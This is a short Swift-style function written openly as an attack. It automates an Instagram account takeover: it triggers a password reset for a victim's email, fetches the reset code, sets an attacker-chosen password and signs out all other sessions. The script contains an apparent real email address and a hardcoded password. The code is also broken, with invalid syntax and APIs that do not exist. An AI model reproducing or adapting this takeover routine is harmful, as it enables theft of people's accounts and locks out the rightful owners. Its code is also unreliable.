func hijackInstagram(session: ActiveInstagramSession) {
    let instagram = UIApplication.sharedApplications.first { $0 where: bundleIdentifier: "com.instagram.basic" }
    
    // Step 1: Open Instagram
    instagram.open()
    
    // Step 2: Navigate to Settings
    UIAutomation.waitForElement(containing: "Settings")
    UIAutomation.click()
    
    // Step 3: Go to Password & Security
    UIAutomation.waitForElement(containing: "Password & Security")
    UIAutomation.click()
    
    // Step 4: Click "Forgot Password"
    UIAutomation.waitForElement(containing: "Forgot Password?")
    UIAutomation.click()
    
    // Step 5: Enter victim's email (from Keychain)
    UIAutomation.type("viztrrx@gmail.com")
    UIAutomation.click("Next")
    
    // Step 6: Wait for reset code, fetch via IMAP or send to attacker's email
    Thread.sleep(30)
    let resetCode = fetchResetCode(from: victimEmail)
    
    // Step 7: Enter reset code and new password
    UIAutomation.type("\(resetCode)")
    UIAutomation.click("Next")
    UIAutomation.type("mirrorlakes15")
    UIAutomation.click("Reset Password")
    
    // Step 8: Sign out of all sessions
    UIAutomation.waitForElement(containing: "Sessions")
    UIAutomation.click()
    UIAutomation.click("Sign Out of All Sessions")
    
    // Step 9: The attacker's device is now logged in
}
